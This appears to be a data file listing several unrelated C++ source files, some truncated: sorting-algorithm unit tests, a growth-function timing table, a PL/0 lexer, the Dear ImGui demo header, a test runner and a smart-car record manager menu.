    "#include <gtest/gtest.h>\r\n\r\n\r\n#include \"Insertion_Sort.h\"\r\n#include \"Selection_Sort.h\"\r\n#include \"Exchange_Sort.h\"\r\n#include \"bubble_Sort.h\"\r\n#include \"Optimized_Bubble_Sort.h\" \r\n\r\n//\u00f2\u00e5\u00f1\u00f2\u00fb \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00ea\u00e8 \u00e2\u00f1\u00f2\u00e0\u00e2\u00ea\u00e0\u00ec\u00e8\r\nTEST(Insertion_Sort_Test, one_element) {\r\n    int arr[] = { 4 };\r\n    Insert_Sort(arr, 1);\r\n    EXPECT_EQ(arr[0], 4);\r\n}\r\n\r\nTEST(Insertion_Sort_Test, sorted_element) {\r\n    int arr[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    Insert_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Insertion_Sort_Test, Reversed_element) {\r\n    int arr[] = { 7, 6, 5, 4, 3, 2, 1 };\r\n    Insert_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Insertion_Sort_Test, Double_element) {\r\n    double arr[] = { 6.1, -1.8, 2.0, -7.5, 0.0 };\r\n    Insert_Sort(arr, 5);\r\n    double expected[] = { -7.5, -1.8, 0.0, 2.0, 6.1 };\r\n    for (int i = 0; i < 5; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\n    //\u00f2\u00e5\u00f1\u00f2\u00fb \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00ea\u00e8 \u00e2\u00fb\u00e1\u00ee\u00f0\u00ee\u00ec\r\n\r\nTEST(Selection_Sort_Test, one_element) {\r\n    int arr[] = { 4 };\r\n    Selection_Sort(arr, 1); \r\n    EXPECT_EQ(arr[0], 4);\r\n}\r\n\r\nTEST(Selection_Sort_Test, sorted_element) {\r\n    int arr[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    Selection_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Selection_Sort_Test, Reversed_element) {\r\n    int arr[] = { 7, 6, 5, 4, 3, 2, 1 };\r\n    Selection_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Selection_Sort_Test, Double_element) {\r\n    double arr[] = { 6.1, -1.8, 2.0, -7.5, 0.0 };\r\n    Selection_Sort(arr, 5);\r\n    double expected[] = { -7.5, -1.8, 0.0, 2.0, 6.1 };\r\n    for (int i = 0; i < 5; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\n//\u00f2\u00e5\u00f1\u00f2\u00fb \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00ea\u00e8 \u00ee\u00e1\u00ec\u00e5\u00ed\u00ee\u00ec\r\n\r\nTEST(Exchange_Sort_Test, one_element) {\r\n    int arr[] = { 4 };\r\n    Exchange_Sort(arr, 1);\r\n    EXPECT_EQ(arr[0], 4);\r\n}\r\n\r\nTEST(Exchange_Sort_Test, sorted_element) {\r\n    int arr[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    Exchange_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Exchange_Sort_Test, Reversed_element) {\r\n    int arr[] = { 7, 6, 5, 4, 3, 2, 1 };\r\n    Exchange_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Exchange_Sort_Test, Double_element) {\r\n    double arr[] = { 6.1, -1.8, 2.0, -7.5, 0.0 };\r\n    Exchange_Sort(arr, 5);\r\n    double expected[] = { -7.5, -1.8, 0.0, 2.0, 6.1 };\r\n    for (int i = 0; i < 5; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\n\r\n//\u00f2\u00e5\u00f1\u00f2\u00fb \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00ea\u00e8 \u00ef\u00f3\u00e7\u00fb\u00f0\u00fc\u00ea\u00ee\u00ec\r\n\r\nTEST(bubble_Sort_Test, one_element) {\r\n    int arr[] = { 4 };\r\n    bubble_Sort(arr, 1); \r\n    EXPECT_EQ(arr[0], 4);\r\n}\r\n\r\nTEST(bubble_Sort_Test, sorted_element) {\r\n    int arr[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    bubble_Sort(arr, 7); \r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(bubble_Sort_Test, Reversed_element) {\r\n    int arr[] = { 7, 6, 5, 4, 3, 2, 1 };\r\n    bubble_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(bubble_Sort_Test, Double_element) {\r\n    double arr[] = { 6.1, -1.8, 2.0, -7.5, 0.0 };\r\n    bubble_Sort(arr, 5);\r\n    double expected[] = { -7.5, -1.8, 0.0, 2.0, 6.1 };\r\n    for (int i = 0; i < 5; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\n//\u00f2\u00e5\u00f1\u00f2\u00fb \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00ee\u00e2\u00ea\u00e8 \u00ef\u00f3\u00e7\u00fb\u00f0\u00fc\u00ea\u00ee\u00ec \u00f1 \u00f3\u00eb\u00f3\u00f7\u00f8\u00e5\u00ed\u00e8\u00ff\u00ec\u00e8\r\n\r\nTEST(Optimized_Bubble_Sort_Test, one_element) {\r\n    int arr[] = { 4 };\r\n    Optimized_Bubble_Sort(arr, 1); \r\n    EXPECT_EQ(arr[0], 4);\r\n}\r\n\r\nTEST(Optimized_Bubble_Sort_Test, sorted_element) {\r\n    int arr[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    Optimized_Bubble_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Optimized_Bubble_Sort_Test, Reversed_element) {\r\n    int arr[] = { 7, 6, 5, 4, 3, 2, 1 };\r\n    Optimized_Bubble_Sort(arr, 7);\r\n    int expected[] = { 1, 2, 3, 4, 5, 6, 7 };\r\n    for (int i = 0; i < 7; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n\r\nTEST(Optimized_Bubble_Sort_Test, Double_element) {\r\n    double arr[] = { 6.1, -1.8, 2.0, -7.5, 0.0 };\r\n    Optimized_Bubble_Sort(arr, 5);\r\n    double expected[] = { -7.5, -1.8, 0.0, 2.0, 6.1 };\r\n    for (int i = 0; i < 5; i++) {\r\n        EXPECT_EQ(arr[i], expected[i]);\r\n    }\r\n}\r\n    int main(int argc, char** argv) {\r\n        ::testing::InitGoogleTest(&argc, argv);\r\n        return RUN_ALL_TESTS();\r\n    }",
    "\ufeff#include <iostream>;\n#include <cmath>\n#include <vector>\n\nusing namespace std;\n\nint main() {\n\tvector<double> nans;\n\tvector<double> rootnans;\n\tvector<double> n2ans;\n\tvector<double> n3ans;\n\tvector<double> nin2ans;\n\tvector<double> lgnans;\n\tvector<double> nlgnans;\n\tvector<double> ninnans;\n\tvector<double> bignans;\n\tdouble time[] = { 1, 60, 3600, 86400, 2628000, 31536000, 3153600000 };\n\tdouble sec = pow(10, 6);\n\t//nans\n\tstd::cout << \"f(n) = n: \";\n\tfor (auto i : time) {\n\t\tnans.push_back(sec * i);\n\t}\n\tfor (auto i : nans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//rootnans\n\tstd::cout << \"f(n) = sqrt(n): \";\n\tfor (auto i : time) {\n\t\trootnans.push_back(pow(sec * i, 2));\n\t}\n\tfor (auto i : rootnans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//n2ans\n\tstd::cout << \"f(n) = n^2: \";\n\tfor (auto i : time) {\n\t\tn2ans.push_back(pow(sec * i, 0.5));\n\t}\n\tfor (auto i : n2ans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//n3ans\n\tstd::cout << \"f(n) = n^3: \";\n\tfor (auto i : time) {\n\t\tn3ans.push_back(pow(sec * i, 1.0 / 3.0));\n\t}\n\tfor (auto i : n3ans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//nin2ans\n\tstd::cout << \"f(n) = 2^n: \";\n\tfor (auto i : time) {\n\t\tnin2ans.push_back(std::log(sec * i) / std::log(2.0));\n\t}\n\tfor (auto i : nin2ans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//lgnans\n\tstd::cout << \"f(n) = lg(n): \";\n\tfor (auto i : time) {\n\t\tlgnans.push_back(pow(sec * i, 10.0));\n\t}\n\tfor (auto i : lgnans) std::cout << i << \"  \";\n\tstd::cout << endl;\n\t//nlgnans\n\t/*std::cout << \"f(n) = n*lg(n): \";\n\tfor (auto i : time) {\n\t\tdouble n = i * sec;\n\t\twhile (n * log10(n) > i * sec) n--;\n\t\tnlgnans.push_back(n);\n\t\tstd::cout << nlgnans.back() << \"  \";\n\t}\n\tstd::cout << endl;*/\n\t//nin\n\tstd::cout << \"f(n) = n^n: \";\n\tfor (auto i : time) {\n\t\tdouble n = i * sec;\n\t\twhile (pow(n, n) > i * sec) n--;\n\t\tninnans.push_back(n);\n\t\tstd::cout << ninnans.back() << \"  \";\n\t}\n\tstd::cout << endl;\n\t//bignans\n\n}",
    "/**\n * @file LexicalAnalyzer.cpp\n * @brief This file contains the implementation of a lexical analyzer for PL/0.\n * \n * @details\n * The lexical analyzer reads the source code character by character, groups characters into tokens, and assigns a type to each token.\n * It handles different types of tokens such as keywords, identifiers, numbers, and operators. It also manages errors for unrecognized characters\n * and handles special cases like comments and whitespace.\n * \n * The main functions in this file are:\n * void scaner(): This function performs the lexical analysis by reading characters from the source code, grouping them into tokens, and assigning types.\n * void read(): This function reads the entire source code from a file into a buffer.\n * int main(): The main function that drives the lexical analysis process, reads the source code, calls the scanner, and outputs the results.\n *\n * The results of the lexical analysis are written to an output file specified by the `RESULT` macro.\n * \n * @author CheeseSilly\n * @date 2024-10-16\n */\n#include\"util.h\"\n\n\nvoid scaner()\n{\n\t\n    //initialize the token array\n\tfor (n = 0; n<10; n++) \n\t\ttoken[n] = '\\0';\n\tch = prog[p++];\n\n\t//skip the space\n\t// while (ch == ' ')\n\t// {\n\t// \tch = prog[p];\n\t// \tp++;\n\t// }\n\n\t//skip the comment and space\n    while (ch == ' ' || ch == '{')\n    {\n        if (ch == '{') {\n            //skip the comment\n            while (ch != '}' && ch != '\\0') {\n                ch = prog[p++];\n            }\n            ch = prog[p++];\n        } else {\n            ch = prog[p++];\n        }\n    }\n\n\t//scan the token\n\tif ((ch >= 'a'&&ch <= 'z') || (ch >= 'A'&&ch <= 'Z'))  \n\t{\n\t\t//Initialize m to 0,which is used to track the index of the token array\n\t\tm = 0;\n\t\twhile ((ch >= '0'&&ch <= '9') || (ch >= 'a'&&ch <= 'z') || (ch >= 'A'&&ch <= 'Z'))\n\t\t{\n\t\t\ttoken[m++] = ch;\n\t\t\tch = prog[p++];\n\t\t}\n\n\t\t//end the token array\n\t\ttoken[m++] = '\\0';\n\t\tstrcpy(arr_value, token);\n\t\tarr_num=m-1;\n\t\tp--;\n\t\tsyn = 10;\n\n        //check if the token is a reserved word,all reserved words are lowercase\n\t\tfor (n = 0; n<7; n++)  \n\t\t\tif (token==rwtab1[n])\n\t\t\t{\n\t\t\t\tsyn = n + 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\tfor (n = 0; n < 4;n++)\n\t\t{\n\t\t\tif (token==rwtab2[n])\n\t\t\t{\t\n\t\t\t\tif(n==1)\n\t\t\t\t{\n\t\t\t\t\tarr_flag=1;\n\t\t\t\t}\n\t\t\t\tsyn = n + 31;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t//check array\n\telse if ((ch == '('&&arr_flag==1)) {\n\t\tstrcpy(token, arr_value);\n        m = arr_num;\n        token[m++] = ch;\n        ch = prog[p++];\n        while (ch != ')' && ch != '\\0') {\n            token[m++] = ch;\n            ch = prog[p++];\n        }\n        token[m++] = ch; // add')'\n        token[m] = '\\0';\n        syn = 30;\n\t\tarr_flag = 0;\n\t\tarr_num = 0;\n    }\n\n\telse if ((ch >= '0'&&ch <= '9'))  //store the number with the sum\n\t{\n\t\tsum = 0;\n\t\twhile ((ch >= '0'&&ch <= '9'))\n\t\t{\n            //only support the integer\n\t\t\tsum = sum * 10 + ch - '0';\n\t\t\tch = prog[p++];\n\t\t}\n\t\tp--;\n\t\tsyn = 11;\n\t\t//max=32767\n\t\tif (sum>32767)\n\t\t\tsyn = -1;\n\t}\n\t//check the operator and delimiter\n\telse switch (ch)   \n\t{\n\tcase '<':\n\t\tm = 0; \n\t\ttoken[m++] = ch;\n\t\tch = prog[p++];\n\t\tif (ch == '>')\n\t\t{\n\t\t\t//for <>\n\t\t\tsyn = 21;\n\t\t\ttoken[m++] = ch;\n\t\t}\n\t\telse if (ch == '=')\n\t\t{\n\t\t\t//for <=\n\t\t\tsyn = 22;\n\t\t\ttoken[m++] = ch;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t//for <\n\t\t\tsyn = 23;\n\t\t\t//back to the front of <\n\t\t\tp--;\n\t\t}\n\t\tbreak;\n\tcase '>':\n\t\tm = 0; \n\t\ttoken[m++] = ch;\n\t\tch = prog[p++];\n\t\tif (ch == '=')\n\t\t{\n\t\t\tsyn = 24;\n\t\t\ttoken[m++] = ch;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsyn = 20;\n\t\t\tp--;\n\t\t}\n\t\tbreak;\n\tcase ':':\n\t\tm = 0; \n\t\ttoken[m++] = ch;\n\t\tch = prog[p++];\n\t\tif (ch == '=')\n\t\t{\n\t\t\t//:=\n\t\t\tsyn = 18;\n\t\t\ttoken[m++] = ch;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t//:\n\t\t\tsyn = 17;\n\t\t\tp--;\n\t\t}\n\t\tbreak;\n\tcase '*':\n\t\tsyn = 13; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '/':\n\t\tsyn = 14; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '+':\n\t\tsyn = 15; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '-':\n\t\tsyn = 16; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '=':\n\t\tsyn = 25; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase ';':\n\t\tsyn = 26; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '(':\n\t\tsyn = 27; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase ')':\n\t\tsyn = 28; \n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase ',':\n\t\tsyn = 29;\n\t\ttoken[0] = ch;\n\t\tbreak;\n\tcase '!':\n\t\tsyn = 30;\n\t\ttoken[0] = ch;\n\t\tbreak;\n\tcase '.':\n\t\t//end.\n\t\tsyn = 0;\n\t\ttoken[0] = ch; \n\t\tbreak;\n\tcase '\\n':\n\t\t//change the line,line++\n\t\tsyn = -2; \n\t\tbreak;\n\tdefault: \n\t\t//undefined character,return error\n\t\tsyn = -1; \n\t\tbreak;\n\t}\n}\n\nvoid read()\n{\n\tFILE *fp;\n\tfp = fopen(CODE, \"r\");\n\t//get the size of the file\n\tfseek(fp, 0, SEEK_END);\n\tint file_size;\n\tfile_size = ftell(fp);\n\tfseek(fp, 0, SEEK_SET);\n\tprog = new char[file_size*sizeof(char)];\t\n\t//read the file\n\tfread(prog, file_size, sizeof(char), fp);\n\tfclose(fp);\n}\n\nint main()\n{\n\tint p = 0;\n\tint line = 1;\n\tstd::ofstream outfile(RESULT);\n\tread();\n\tp = 0;\n\tdo\n\t{\n\t\tscaner();\n\t\tswitch (syn)\n\t\t{\n\t\t//output number\n\t\tcase 11: \n\t\t\toutfile << \"(\" << syn << \",\" << sum << \")\" << std::endl;\n\t\t\tbreak;\n\t\t//output error\n\t\tcase -1: \n\t\t\toutfile << \"Error in line\" << line << \"!\" << std::endl;\n\t\t\tbreak;\n\t\t//handle the line change\n\t\tcase -2: \n\t\t\tline = line++; \n\t\t\tbr",
    "// dear imgui, v1.85 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowMisc()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n// System includes\n#include <ctype.h>          // toupp",
    "/**\n * @file test_all.cpp\n */\n\n#include <cstddef>        // for std::size_t\n#include <cstdlib>        // for EXIT_FAILURE, EXIT_SUCCESS\n#include <exception>      // for std::exception\n#include <functional>     // for std::function\n#include <random>         // for std::mt19937, std::shuffle\n#include <stdexcept>      // for std::runtime_error\n#include <string>         // for std::string\n#include <unordered_map>  // for std::unordered_map\n#include <vector>         // for std::vector\n\n#include <SFML/Graphics.hpp>\n#include <fmt/core.h>\n\n#include \"core/assets.hpp\"\n#include \"core/rng.hpp\"\n#include \"core/string.hpp\"\n#include \"modules/vocabulary.hpp\"\n#if defined(_WIN32)\n#include \"core/io.hpp\"\n#endif\n\nnamespace test_assets {\n[[nodiscard]] int load_font();\n}\n\nnamespace test_rng {\n[[nodiscard]] int instance();\n[[nodiscard]] int get_random_number();\n[[nodiscard]] int get_random_bool();\n}  // namespace test_rng\n\nnamespace test_string {\n[[nodiscard]] int to_sfml_string();\n}\n\nnamespace test_vocabulary {\n[[nodiscard]] int entry();\n[[nodiscard]] int category_count();\n}  // namespace test_vocabulary\n\n/**\n * @brief Entry-point of the test application.\n *\n * @param argc Number of command-line arguments (e.g., \"2\").\n * @param argv Array of command-line arguments (e.g., {\"./bin\", \"-h\"}).\n *\n * @return EXIT_SUCCESS if the test application ran successfully, EXIT_FAILURE otherwise.\n */\nint main(int argc,\n         char **argv)\n{\n#if defined(_WIN32)\n    // Setup UTF-8 input/output on Windows (does nothing on other platforms)\n    if (const auto e = core::io::setup_utf8_console(); e.has_value()) {\n        fmt::print(stderr, \"Warning: {}\\n\", *e);\n    }\n#endif\n\n    // Define the formatted help message\n    const std::string help_message = fmt::format(\n        \"Usage: {} <test>\\n\"\n        \"\\n\"\n        \"Run automatic tests.\\n\"\n        \"\\n\"\n        \"Positional arguments:\\n\"\n        \"  test  name of the test to run ('all' to run all tests)\\n\",\n        argv[0]);\n\n    // If no arguments, print help message and exit\n    if (argc == 1) {\n        fmt::print(\"{}\\n\", help_message);\n        return EXIT_FAILURE;\n    }\n\n    // Otherwise, define argument to function mapping\n    const std::unordered_map<std::string, std::function<int()>> tests = {\n        {\"test_assets::load_font\", test_assets::load_font},\n        {\"test_rng::instance\", test_rng::instance},\n        {\"test_rng::get_random_number\", test_rng::get_random_number},\n        {\"test_rng::get_random_bool\", test_rng::get_random_bool},\n        {\"test_string::to_sfml_string\", test_string::to_sfml_string},\n        {\"test_vocabulary::entry\", test_vocabulary::entry},\n        {\"test_vocabulary::category_count\", test_vocabulary::category_count},\n    };\n\n    // Get the test name from the command-line arguments\n    const std::string arg = argv[1];\n\n    // If the test name is found, run the corresponding test\n    if (const auto it = tests.find(arg); it != tests.cend()) {\n        try {\n            return it->second();\n        }\n        catch (const std::exception &e) {\n            fmt::print(stderr, \"Test '{}' threw an exception: {}\\n\", arg, e.what());\n            return EXIT_FAILURE;\n        }\n    }\n    else if (arg == \"all\") {\n        // Run all tests sequentially and print the results\n        bool all_passed = true;\n        for (const auto &[name, test_func] : tests) {\n            fmt::print(\"Running test: {}\\n\", name);\n            try {\n                const int result = test_func();\n                if (result != EXIT_SUCCESS) {\n                    all_passed = false;\n                    fmt::print(stderr, \"Test '{}' failed.\\n\", name);\n                }\n                else {\n                    fmt::print(\"Test '{}' passed.\\n\", name);\n                }\n            }\n            catch (const std::exception &e) {\n                all_passed = false;\n                fmt::print(stderr, \"Test '{}' threw an exception: {}\\n\", name, e.what());\n            }\n        }\n        return all_passed ? EXIT_SUCCESS : EXIT_FAILURE;\n    }\n    else {\n        fmt::print(stderr, \"Error: Invalid test name: '{}'\\n\\n{}\\n\", arg, help_message);\n        return EXIT_FAILURE;\n    }\n}\n\nint test_assets::load_font()\n{\n    try {\n        const sf::Font &font = core::assets::load_font();\n        // Get font properties\n        const std::string family = font.getInfo().family;\n        const std::string expected_family = \"NanumGothic\";\n        if (family != expected_family) {\n            throw std::runtime_error(fmt::format(\"The actual font family '{}' is not equal to expected '{}'\", family, expected_family));\n        }\n        const bool smooth = font.isSmooth();\n        constexpr bool expected_smooth = true;\n        if (smooth != expected_smooth) {\n            throw std::runtime_error(fmt::format(\"The actual font smooth property '{}' is not equal to expected '{}'\", smooth, expected_smooth));\n        }\n        fmt::print(\"core::assets::load_font() passed.\\n\");\n        return EXIT_SUCCESS;\n    }\n    catch (const std::exception &e) {\n        fm",
    "#include <iostream>\n#include <cstdlib>\n#include \"smartCar.h\"\n#include \"student.h\"\n#include \"file.h\"\nusing namespace std;\n// flag  ==>  0-> \u9000\u51fa\u754c\u9762    1->\u4e3b\u754c\u9762    2->\u8bbe\u7f6e\u754c\u9762\nunsigned int flag = 1;\nvector<SmartCar> carList;\nvector<Student> stuList;\nunsigned int idx = 0;\n\nvoid tip(int count)\n{\n    switch (count)\n    {\n    case 0:\n        cout << \"\\033[1;33m\u65e0\u6548\u8f93\u5165, \u8bf7\u91cd\u65b0\u8f93\u5165\u3002\\033[0n\" << endl;\n        break;\n    case 1:\n        cout << \"\\033[1;33m[n]\u663e\u793a\u4e0b\u4e00\u8f86\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[p]\u663e\u793a\u4e0a\u4e00\u8f86\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[a]\u65b0\u589e\u4e00\u8f86\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[s]\u8bbe\u7f6e\u5f53\u524d\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[w]\u4fdd\u5b58\u5f53\u524d\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[r]\u8bfb\u53d6\u672c\u5730\u5b66\u751f\u548c\u5c0f\u8f66\u4fe1\u606f\\n[e]\u64cd\u4f5c\u5f53\u524d\u5c0f\u8f66\\n[q]\u9000\u51fa\u7a0b\u5e8f\\033[0m\" << endl;\n        break;\n    case 2:\n        cout << \"\\033[1;33m[0]\u8fd4\u56de\u4e0a\u4e00\u5c42\\n[1]\u8bbe\u7f6e\u5b66\u751f\u57fa\u672c\u4fe1\u606f\\n[2]\u8bbe\u7f6e\u5c0f\u8f66\u57fa\u672c\u4fe1\u606f\\n[3]\u8bbe\u7f6e\u5c0f\u8f66\u5e95\u76d8\u4fe1\u606f\\n[4]\u8bbe\u7f6e\u5c0f\u8f66\u8f6e\u80ce\u4fe1\u606f\\n[5]\u8bbe\u7f6e\u5c0f\u8f66AGX\u5957\u4ef6\\n[6]\u8bbe\u7f6e\u5c0f\u8f66\u53cc\u76ee\u6444\u50cf\u5934\u4fe1\u606f\\n[7]\u8bbe\u7f6e\u5c0f\u8f66\u4e5d\u9640\u87ba\u4eea\u4fe1\u606f\\n[8]\u8bbe\u7f6e\u5c0f\u8f66\u591a\u7ebf\u6fc0\u5149\u96f7\u8fbe\u4fe1\u606f\\n[9]\u8bbe\u7f6e\u5c0f\u8f66\u6db2\u6676\u663e\u793a\u5c4f\u4fe1\u606f\\n[10]\u8bbe\u7f6e\u5c0f\u8f66\u7535\u6c60\u6a21\u5757\u4fe1\u606f\\n[11]\u8bbe\u7f6e\u5c0f\u8f66\u6240\u6709\u4fe1\u606f\\033[0m\" << endl;\n        break;\n    case 3:\n        cout << \"\\033[1;33m================\u8bbe\u7f6e\u6210\u529f================\\033[0m\" << endl;\n        break;\n    case 4:\n        cout << \"\\033[1;33m======\u4fdd\u5b58\u6210\u529f, \u8bf7\u5728ouTextx\u76ee\u5f55\u4e0b\u67e5\u770b======\\033[0m\" << endl;\n        break;\n    case 5:\n        cout << \"\\033[1;33m[0]\u968f\u673a\u751f\u6210\\n[1]\u624b\u52a8\u751f\u6210\\n[2]\u8bfb\u53d6\u672c\u5730\\n[3]\u53d6\u6d88\u751f\u6210\\033[0m\" << endl;\n        break;\n    case 6:\n        cout << \"\\033[1;33m==========\u5f53\u524d\u5df2\u7ecf\u662f\u7b2c\u4e00\u4e2a\u4fe1\u606f\u4e86==========\\033[0m\" << endl;\n        break;\n    case 7:\n        cout << \"\\033[1;33m==========\u5f53\u524d\u5df2\u7ecf\u662f\u6700\u540e\u7684\u4fe1\u606f\u4e86==========\\033[0m\" << endl;\n        break;\n    case 8:\n        cout << 